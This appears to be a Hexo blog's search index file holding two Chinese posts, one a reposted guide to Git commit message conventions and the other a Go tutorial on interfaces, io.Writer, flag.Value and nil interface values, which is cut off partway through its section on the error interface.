<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Githubのcommit 规范</title>
      <link href="/posts/8d089fc2f201/"/>
      <url>/posts/8d089fc2f201/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文转载于<a href="https://gngtwhh.space/20248befcc09ef89/">Github提交规范 | WAHAHA’s blog (gngtwhh.space)</a></p></blockquote><h2 id="为什么要规定提交规范"><a class="markdownIt-Anchor" href="#为什么要规定提交规范"></a> 为什么要规定提交规范</h2><p>团队协作开发时，每个人提交都会编写自己的<code>commit message</code>。</p><p>如果不加以规范，最终项目就会杂乱不堪,难以管理。</p><p>一般的大厂，大型开源项目的<code>commit message</code>格式是非常一致的，便于管理，提高效率。</p><h2 id="git提交规范"><a class="markdownIt-Anchor" href="#git提交规范"></a> Git提交规范</h2><p>为了方便使用，我们避免了过于复杂的规定，格式较为简单且不限制中英文：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;<span class="built_in">type</span>&gt;(&lt;scope&gt;): &lt;subject&gt;</span><br><span class="line">// 注意冒号 : 后有空格</span><br><span class="line">// 如 feat(miniprogram): 增加了小程序模板消息相关功能</span><br></pre></td></tr></table></figure><span class="bubble-content">scope</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">选填 </span></span>表示commit的作用范围，如数据层、视图层，也可以是目录名称。<span class="bubble-content">subject</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">必填 </span></span>用于对commit进行简短的描述。<span class="bubble-content">type</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">必填 </span></span>表示提交类型，值有以下几种：<ul><li>feat - 新功能 feature</li><li>fix - 修复 bug</li><li>docs - 文档注释</li><li>style - 代码格式(不影响代码运行的变动)</li><li>refactor - 重构、优化(既不增加新功能，也不是修复bug)</li><li>perf - 性能优化</li><li>test - 增加测试</li><li>chore - 构建过程或辅助工具的变动</li><li>revert - 回退</li><li>build - 打包</li></ul><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/4C04B4E3A66D79005E4BB402DFC0E397.jpg" alt="4C04B4E3A66D79005E4BB402DFC0E397" /></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go修炼手册——接口</title>
      <link href="/posts/3eaf2f8154b3/"/>
      <url>/posts/3eaf2f8154b3/</url>
      
        <content type="html"><![CDATA[<p>本章我们来学习Go语言中接口的概念。单论接口的使用来说，学习它并不困难。但更重要的是理解Go语言中接口的设计哲学，即“面向接口编程”和“面向对象编程”背后的底层逻辑。倘若不好好弄清楚接口的设计理念，那么在实际业务中也难以派上用场。</p><p>首先我们来介绍接口的定义，之后单独抽一小节来阐述接口的设计理念，最后详细介绍Go语言中接口的使用方法。</p><h2 id="接口约定"><a class="markdownIt-Anchor" href="#接口约定"></a> 接口约定</h2><p>接口类型是一种抽象的类型。它不会暴露出它所代表的对象的内部值的结构和这个对象支持的基础操作的集合；它们只会表现出它们自己的方法。</p><p>要定义一个接口，使用<code>type</code>关键字即可。我们以中的io.Writer接口为例：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> io</span><br><span class="line"></span><br><span class="line"><span class="comment">// Writer is the interface that wraps the basic Write method.</span></span><br><span class="line"><span class="keyword">type</span> Writer <span class="keyword">interface</span> &#123;</span><br><span class="line">    <span class="comment">// Write writes len(p) bytes from p to the underlying data stream.</span></span><br><span class="line">    <span class="comment">// It returns the number of bytes written from p (0 &lt;= n &lt;= len(p))</span></span><br><span class="line">    <span class="comment">// and any error encountered that caused the write to stop early.</span></span><br><span class="line">    <span class="comment">// Write must return a non-nil error if it returns n &lt; len(p).</span></span><br><span class="line">    <span class="comment">// Write must not modify the slice data, even temporarily.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Implementations must not retain p.</span></span><br><span class="line">Write(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，声明一个接口的方法很简单，只需要<code>type</code>+接口名+<code>interface</code>即可。</p><p>同时展示接口的使用方法，我们给出Fprintf函数的定义，它调用了io.Writer接口。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fmt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Fprintf</span><span class="params">(w io.Writer, format <span class="type">string</span>, args ...<span class="keyword">interface</span>&#123;&#125;)</span></span> (<span class="type">int</span>, <span class="type">error</span>)</span><br></pre></td></tr></table></figure><p>io.Writer类型定义了函数Fprintf和这个函数调用者之间的约定。一方面这个约定需要调用者提供具体类型的值就像<code>*os.File</code>和<code>*bytes.Buffer</code>，这些类型都有一个特定签名和行为的Write的函数；另一方面这个约定保证了Fprintf接受任何满足io.Writer接口的值都可以工作。Fprintf函数没有假定写入的是一个文件或是一段内存，而是写入一个可以调用Write函数的值。</p><p>我们可以定义一个新的类型进行校验，下面<code>*ByteCounter</code>类型的Write方法，仅仅在丢弃写向它的字节前统计它的长度。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ByteCounter <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *ByteCounter)</span></span> Write(p []<span class="type">byte</span>) (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    *c += ByteCounter(<span class="built_in">len</span>(p)) <span class="comment">// convert int to ByteCounter</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(p), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是由于<code>*ByteCounter</code>满足io.Writer的约定，我们可以把它传入Fprintf函数中；Fprintf函数执行字符串格式化的过程不会去关注ByteCounter正确的累加结果的长度。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c ByteCounter</span><br><span class="line">c.Write([]<span class="type">byte</span>(<span class="string">&quot;hello&quot;</span>))</span><br><span class="line">fmt.Println(c) <span class="comment">// &quot;5&quot;, = len(&quot;hello&quot;)</span></span><br><span class="line">c = <span class="number">0</span> <span class="comment">// reset the counter</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;Dolly&quot;</span></span><br><span class="line">fmt.Fprintf(&amp;c, <span class="string">&quot;hello, %s&quot;</span>, name)</span><br><span class="line">fmt.Println(c) <span class="comment">// &quot;12&quot;, = len(&quot;hello, Dolly&quot;)</span></span><br></pre></td></tr></table></figure><p>通过以上的例子，我们已经掌握了接口的基本用法。接着我们来说说接口为什么要这么做，或者说，这么做是为了什么。</p><h2 id="接口的设计哲学"><a class="markdownIt-Anchor" href="#接口的设计哲学"></a> 接口的设计哲学</h2><p>已单独整理成一篇文章：<a href="https://adamben.top/posts/7a99acb03ff0/">番外：Go 接口的设计哲学 | Adam8en の 8log (adamben.top)</a></p><h2 id="接口类型"><a class="markdownIt-Anchor" href="#接口类型"></a> 接口类型</h2><p>接口类型具体描述了一系列方法的集合，一个实现了这些方法的具体类型是这个接口类型的实例。也就是说，实现接口是隐式的，并不需要“implement”关键字来显示实现。</p><p>接口类型可以直接在定义中写明方法，也可以通过组合已有的接口来定义新的接口类型：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> io</span><br><span class="line"><span class="keyword">type</span> Reader <span class="keyword">interface</span>&#123;</span><br><span class="line">    Read(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Closer <span class="keyword">interface</span>&#123;</span><br><span class="line">    Close() <span class="type">error</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ReadWriter <span class="keyword">interface</span>&#123;</span><br><span class="line">    Reader</span><br><span class="line">    Writer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ReadWriteCloser <span class="keyword">interface</span>&#123;</span><br><span class="line">    Reader</span><br><span class="line">    Writer</span><br><span class="line">    Closer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面用到的语法和结构内嵌相似，我们可以用这种方式以一个简写命名一个接口，而不用声明它所有的方法。这种方式称为<strong>接口内嵌</strong>。当然，在接口里不使用内嵌而重写定义也是可以的，甚至使用混合风格都没有问题。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ReadWriter <span class="keyword">interface</span> &#123;</span><br><span class="line">    Read(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">    Write(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ReadWriter <span class="keyword">interface</span> &#123;</span><br><span class="line">    Read(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>)</span><br><span class="line">    Writer</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现接口的条件"><a class="markdownIt-Anchor" href="#实现接口的条件"></a> 实现接口的条件</h2><p>接口指定的规则非常简单：表达一个类型属于某个接口只要这个类型实现这个接口。这个规则甚至适用于等式右边本身也是一个接口类型。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> w io.Writer</span><br><span class="line">w = os.Stdout <span class="comment">// OK: *os.File has Write method</span></span><br><span class="line">w = <span class="built_in">new</span>(bytes.Buffer) <span class="comment">// OK: *bytes.Buffer has Write method</span></span><br><span class="line">w = time.Second <span class="comment">// compile error: time.Duration lacks Write method</span></span><br><span class="line"></span><br><span class="line">w = rwc <span class="comment">// OK: io.ReadWriteCloser has Write method</span></span><br><span class="line">rwc = w <span class="comment">// compile error: io.Writer lacks Close method</span></span><br></pre></td></tr></table></figure><p>接下来讲解几个细节：</p><h3 id="指针的接口与语法糖"><a class="markdownIt-Anchor" href="#指针的接口与语法糖"></a> 指针的接口与语法糖</h3><p>在介绍结构体的章节中，对于每一个命名过的具体类型T；它的一些方法的接收者是类型T本身，另一些方法的接受者则是一个 *T 的指针。然而，在T类型的参数上调用一个 *T 的方法是合法的，这是一个语法糖：只要这个参数是一个变量，编译器就会隐式的获取它的地址，然后调用接受者为 *T 的方法。这也意味着另一件事：T类型的值不拥有所有 *T 指针的方法，它可能只实现了更少的接口。</p><p>举例来说，IntSet类型的String方法的接收者是一个指针类型，我们可以在一个IntSet变量上调用这个方法，但我们不能在一个不能寻址的IntSet值上调用这个方法。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> IntSet <span class="keyword">struct</span> &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(*IntSet)</span></span> String() <span class="type">string</span></span><br><span class="line"><span class="keyword">var</span> _ = IntSet&#123;&#125;.String() <span class="comment">// compile error: String requires *IntSet receiver</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s IntSet</span><br><span class="line"><span class="keyword">var</span> _ = s.String() <span class="comment">// OK: s is a variable and &amp;s has a String method</span></span><br></pre></td></tr></table></figure><p>因此，由于只有<code>*IntSet</code>类型有String方法，所以也只有<code>*IntSet</code>类型实现了fmt.Stringer接口。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> _ fmt.Stringer = &amp;s <span class="comment">// OK</span></span><br><span class="line"><span class="keyword">var</span> _ fmt.Stringer = s <span class="comment">// compile error: IntSet lacks String method</span></span><br></pre></td></tr></table></figure><p>这个小细节只要平时注意使用变量，不调用无地址的方法，基本不会遇到bug。</p><h3 id="接口类型封装"><a class="markdownIt-Anchor" href="#接口类型封装"></a> 接口类型封装</h3><p>就像信封封装和隐藏起信件来一样，接口类型封装和隐藏具体类型和它的值。即使具体类型有其它的方法，也只有接口类型暴露出来的方法会被调用到。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">os.Stdout.Write([]<span class="type">byte</span>(<span class="string">&quot;hello&quot;</span>)) <span class="comment">// OK: *os.File has Write method</span></span><br><span class="line">os.Stdout.Close() <span class="comment">// OK: *os.File has Close method</span></span><br><span class="line"><span class="keyword">var</span> w io.Writer</span><br><span class="line">w = os.Stdout</span><br><span class="line">w.Write([]<span class="type">byte</span>(<span class="string">&quot;hello&quot;</span>)) <span class="comment">// OK: io.Writer has Write method</span></span><br><span class="line">w.Close() <span class="comment">// compile error: io.Writer lacks Close method</span></span><br></pre></td></tr></table></figure><p>也就是说，要表达接口必须要实现接口定义的所有方法，是<strong>一个大于或等于的关系</strong>。接口只强求你实现它规定的方法，至于数据类型如果还拥有其他接口未定义的方法，也依然不会报错。只是在调用接口时，你只能调用接口暴露的方法，而不能调用接口隐藏而数据类型持有的其他方法。</p><p>换句话来说，我们可以用接口来实现对数据类型的封装。</p><h3 id="空接口的妙用"><a class="markdownIt-Anchor" href="#空接口的妙用"></a> 空接口的妙用</h3><p>一个有更多方法的接口类型，比如io.ReadWriter，和少一些方法的接口类型例如io.Reader，进行对比；更多方法的接口类型会告诉我们更多关于它的值持有的信息，并且对实现它的类型要求更加严格。那么关于interface{}类型，它没有任何方法，请讲出哪些具体的类型实现了它？</p><p>这看上去好像没有用，但实际上interface{}被称为空接口类型是不可或缺的。因为空接口类型对实现它的类型没有要求，所以我们可以将任意一个值赋给空接口类型。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> any <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">any = <span class="literal">true</span></span><br><span class="line">any = <span class="number">12.34</span></span><br><span class="line">any = <span class="string">&quot;hello&quot;</span></span><br><span class="line">any = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>&#123;<span class="string">&quot;one&quot;</span>: <span class="number">1</span>&#125;</span><br><span class="line">any = <span class="built_in">new</span>(bytes.Buffer)</span><br></pre></td></tr></table></figure><p>对于创建的一个interface{}值持有一个boolean，float，string，map，pointer，或者任意其它的类型；我们当然不能直接对它持有的值做操作，因为interface{}没有任何方法。后续我们会学习用类型断言来获取取interface{}中值的方法。</p><h3 id="接口类型实现的不同情况"><a class="markdownIt-Anchor" href="#接口类型实现的不同情况"></a> 接口类型实现的不同情况</h3><p>非空的接口类型比如io.Writer经常被指针类型实现，尤其当一个或多个接口方法像Write方法那样隐式的给接收者带来变化的时候。一个结构体的指针是非常常见的承载方法的类型，毕竟传递结构体的指针比传递结构体本身要有效率得多。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Counter <span class="keyword">struct</span> &#123;</span><br><span class="line">    count <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Counter)</span></span> Write(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">    c.count += <span class="built_in">len</span>(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(p), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> w io.Writer = &amp;Counter&#123;&#125;</span><br></pre></td></tr></table></figure><p>尽管指针类型是常见的实现方式，但并不是唯一的，其他引用类型（如切片和映射）也可以实现接口。从本质上来说，引用类型实现接口和指针实现接口是一样的。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 切片实现</span></span><br><span class="line"><span class="keyword">type</span> Counter <span class="keyword">struct</span> &#123;</span><br><span class="line">    count <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Counter)</span></span> Write(p []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">    c.count += <span class="built_in">len</span>(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(p), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> w io.Writer = &amp;Counter&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 映射实现</span></span><br><span class="line"><span class="keyword">type</span> Values <span class="keyword">map</span>[<span class="type">string</span>][]<span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Values)</span></span> Write(b []<span class="type">byte</span>) (n <span class="type">int</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="comment">// 自定义实现</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(b), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> w io.Writer = Values&#123;&#125;</span><br></pre></td></tr></table></figure><p>此外，基本类型（如<code>time.Duration</code>）也可以实现某些接口。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> MyDuration time.Duration</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d MyDuration)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> time.Duration(d).String()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s fmt.Stringer = MyDuration(<span class="number">10</span> * time.Second)</span><br></pre></td></tr></table></figure><h2 id="flagvalue接口"><a class="markdownIt-Anchor" href="#flagvalue接口"></a> flag.Value接口</h2><p>学习掌握了一些关于接口的知识，接下来我们来学习Go语言的flag标准库是如何借助接口来帮助命令行标记定义新的符号的。</p><p>首先我们来学习<code>flag.value</code>接口的用法，他有两个方法：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> flag</span><br><span class="line"><span class="comment">// Value is the interface to the value stored in a flag.</span></span><br><span class="line"><span class="keyword">type</span> Value <span class="keyword">interface</span> &#123;</span><br><span class="line">    Set(<span class="type">string</span>) <span class="type">error</span></span><br><span class="line">    String() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>Set(string) error</code>：将标志的值解析为相应的类型。传入参数就是我们从命令行输入的数据，所以接口规定传入参数必须是字符串类型。</li><li><code>String() string</code>：返回该标志的当前值，作为字符串表示。即将当前标志的值回显出来，由于回显到命令行给用户查看，所以返回值必须是字符串形式。</li></ol><p>稍微细心一点的读者可能就注意到了，<code>flag.value</code>接口定义的两个方法是相反的。<code>Set()</code>方法要求将传入的字符串进行处理内化为标志的值，而<code>String()</code>方法则要求返回标志的值，并将其重新回显为字符串。</p><p>下面是一个示例，展示如何自定义一个 <code>flag.Value</code> 类型来处理复杂类型（例如，一个以逗号为标志分隔的列表）：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个类型，用于存储逗号分隔的字符串列表</span></span><br><span class="line"><span class="keyword">type</span> CSV []<span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 flag.Value 接口中的 Set 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CSV)</span></span> Set(value <span class="type">string</span>) <span class="type">error</span> &#123;</span><br><span class="line">*c = strings.Split(value, <span class="string">&quot;,&quot;</span>) <span class="comment">// 将输入的字符串按逗号分割，并存入 CSV 类型</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 flag.Value 接口中的 String 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CSV)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> strings.Join(*c, <span class="string">&quot;,&quot;</span>) <span class="comment">// 将列表转为逗号分隔的字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> csvFlag CSV</span><br><span class="line"><span class="comment">// 使用 flag.Var 函数，传入自定义类型的指针，并定义标志</span></span><br><span class="line">flag.Var(&amp;csvFlag, <span class="string">&quot;csv&quot;</span>, <span class="string">&quot;Comma-separated list&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析命令行标志</span></span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出解析后的值</span></span><br><span class="line">fmt.Println(<span class="string">&quot;Parsed CSV flag:&quot;</span>, csvFlag)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中：</p><ul><li><p>首先定义了一个类型 <code>CSV</code>，用来存储解析后的字符串列表。</p></li><li><p>通过实现 <code>Set</code> 和 <code>String</code> 方法，让 <code>CSV</code> 满足 <code>flag.Value</code> 接口的要求。</p></li><li><p>使用 <code>flag.Var</code> 函数将 <code>CSV</code> 类型与命令行标志 <code>-csv</code> 绑定，这样可以通过命令行输入类似 <code>-csv=a,b,c</code> 的参数，它会自动解析成一个字符串切片 <code>[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code>。</p><p><code>&quot;Comma-separated list&quot;</code>是这个标志的描述，告诉用户该标志接受一个用逗号分隔的字符串列表。当用户在命令行输入 <code>go run main.go -h</code> 时，程序会输出类似如下的信息：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage of ./main:</span><br><span class="line">  -csv Comma-separated list</span><br><span class="line">    Comma-separated list</span><br></pre></td></tr></table></figure></li><li><p><code>flag.Parse()</code>: 这行代码会解析命令行输入的标志。如果用户在命令行中使用了 <code>-csv</code>，这个函数会根据用户输入的值对标志进行解析和赋值。在对flag变量进行定义后，必须调用一次<code>flag.Parse()</code>来解析标志。</p></li></ul><p>执行程序时，如果输入如下命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go run main.go -csv=a,b,c</span><br></pre></td></tr></table></figure><p>将输出：</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Parsed</span> <span class="selector-tag">CSV</span> <span class="selector-tag">flag</span>: <span class="selector-attr">[a b c]</span></span><br></pre></td></tr></table></figure><p>通过这种方式，我们可以自定义更复杂的命令行标志解析逻辑。</p><h2 id="接口值"><a class="markdownIt-Anchor" href="#接口值"></a> 接口值</h2><p>一个接口的值，接口值，由两个部分组成，一个具体的类型和那个类型的值。它们被称为接口的动态类型和动态值。</p><p>下面4个语句中，变量w得到了3个不同的值。（开始和最后的值是相同的）</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> w io.Writer</span><br><span class="line">w = os.Stdout</span><br><span class="line">w = <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">w = <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p>第一个语句<code>var w io.Writer</code>定义了变量w。</p><p>在Go语言中，变量总是被一个定义明确的值初始化，即使接口类型也不例外。对于一个接口的零值就是它的类型和值的部分都是nil。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241011171355457.png" alt="image-20241011171355457" /></p><p>一个接口值基于<span class="bubble-content">它的动态类型被描述为空或非空</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">即当且仅当动态类型为空才会被判定为空接口。若动态值为空而动态类型不为空，该接口仍不为空 </span></span>，所以这是一个空的接口值。你可以通过使用 w==nil或者w!=nil来判断接口值是否为空。调用一个空接口值上的任意方法都会产生<span class="bubble-content">panic</span><span class="bubble-notation"><span class="bubble-item" style="background-color:#868fd7;">w.Write([]byte(hello")) // panic: nil pointer dereference" </span></span>。</p><p>第二个语句<code>w = os.Stdout</code>将一个 <code>*os.File</code> 类型的值赋给变量w。这个接口值的动态类型被设为 *os.File 指针的类型描述符，它的动态值持有os.Stdout的拷贝。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241011171553532.png" alt="image-20241011171553532" /></p><p>调用一个包含 <code>*os.File</code> 类型指针的接口值的<code>Write</code>方法，使得 <code>(*os.File).Write</code> 方法被调用。这个调用输出“hello”。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">w.Write([]<span class="type">byte</span>(<span class="string">&quot;hello&quot;</span>)) <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>通常在编译期，我们不知道接口值的动态类型是什么，所以一个接口上的调用必须使用动态分配。因为不是直接进行调用，所以编译器必须把代码生成在类型描述符的方法Write上，然后间接调用那个地址。这个调用的接收者是一个接口动态值的拷贝，os.Stdout。效果和下面这个直接调用一样：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">os.Stdout.Write([]<span class="type">byte</span>(<span class="string">&quot;hello&quot;</span>)) <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>第三个语句<code>w = new(bytes.Buffer)</code>给接口值赋了一个<code>*bytes.Buffer</code>类型的值。现在动态类型是*bytes.Buffer并且动态值是一个指向新分配的缓冲区的指针。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20241011172349067.png" alt="image-20241011172349067" /></p><p>最后，第四个语句<code>w = nil</code>将nil赋给了接口值。这个重置将它所有的部分都设为nil值，把变量w恢复到和它之前定义时相同的状态。</p><p>接口值可以使用<code>==</code>和<code>!＝</code>来进行比较。两个接口值相等仅当它们都是nil值，或者它们的动态类型相同并且动态值也根据这个动态类型的<code>==</code>操作相等。因为接口值是可比较的，所以它们可以用在 map的键或者作为switch语句的操作数。</p><p>然而，如果两个接口值的动态类型相同，但是这个动态类型是不可比较的（比如切片），将它们 行比较就会失败并且panic。</p><p>考虑到这点，接口类型是非常与众不同的。其它类型要么是安全的可比较类型（如基本类型和指针）要么是完全不可比较的类型（如切片，映射类型，和函数），但是在比较接口值或者包含了接口值的聚合类型时，我们必须要意识到潜在的panic。同样的风险也存在于使用接口作为map的键或者switch的操作数。只能比较你非常确定它们的动态值是可比较类型的接口值。</p><span class='p red'>再次强调！！！</span><p><strong>一个不包含任何值的nil接口值和一个刚好包含nil指针的接口值是不同的</strong>。</p><p>思考下面的程序。当debug变量设置为true时，main函数会将f函数的输出收集到一个bytes.Buffer类型中。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> debug = <span class="literal">true</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> buf *bytes.Buffer</span><br><span class="line">    <span class="keyword">if</span> debug &#123;</span><br><span class="line">    buf = <span class="built_in">new</span>(bytes.Buffer) <span class="comment">// enable collection of output</span></span><br><span class="line">    &#125;</span><br><span class="line">    f(buf) <span class="comment">// <span class="doctag">NOTE:</span> subtly incorrect!</span></span><br><span class="line">    <span class="keyword">if</span> debug &#123;</span><br><span class="line">    <span class="comment">// ...use buf...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If out is non-nil, output will be written to it.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">(out io.Writer)</span></span> &#123;</span><br><span class="line">    <span class="comment">// ...do something...</span></span><br><span class="line">    <span class="keyword">if</span> out != <span class="literal">nil</span> &#123;</span><br><span class="line">    out.Write([]<span class="type">byte</span>(<span class="string">&quot;done!\n&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可能会预计当把变量debug设置为false时可以禁止对输出的收集，但是实际上在out.Write方法调用时程序发生了panic：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> out != <span class="literal">nil</span> &#123;</span><br><span class="line">     out.Write([]<span class="type">byte</span>(<span class="string">&quot;done!\n&quot;</span>)) <span class="comment">// panic: nil pointer dereference</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当main函数调用函数f时，它给f函数的out参数赋了一个<code>*bytes.Buffer</code>的空指针，所以out的动态 值是nil。然而，它的动态类型是<code>*bytes.Buffer</code>，意思就是out变量是一个包含空指针值的<strong>非空接口</strong>。所以防御性检查<code>out!=nil</code>的结果依然是true。</p><h2 id="error接口"><a class="markdownIt-Anchor" href="#error接口"></a> error接口</h2><p>我们继续介绍error类型。很早开始我们就已经在使用error类型，其实他就是interface类型，这个类型有一个返回错误信息的单一方法：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="type">error</span> <span class="keyword">interface</span> &#123;</span><br><span class="line">    Error() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个error最简单的方法就是调用errors.New函数，它会根据传入的错误信息返回一个新的error。整个errors包仅只有4行：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> errors</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(text <span class="type">string</span>)</span></span> <span class="type">error</span> &#123; <span class="keyword">return</span> &amp;errorString&#123;text&#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> 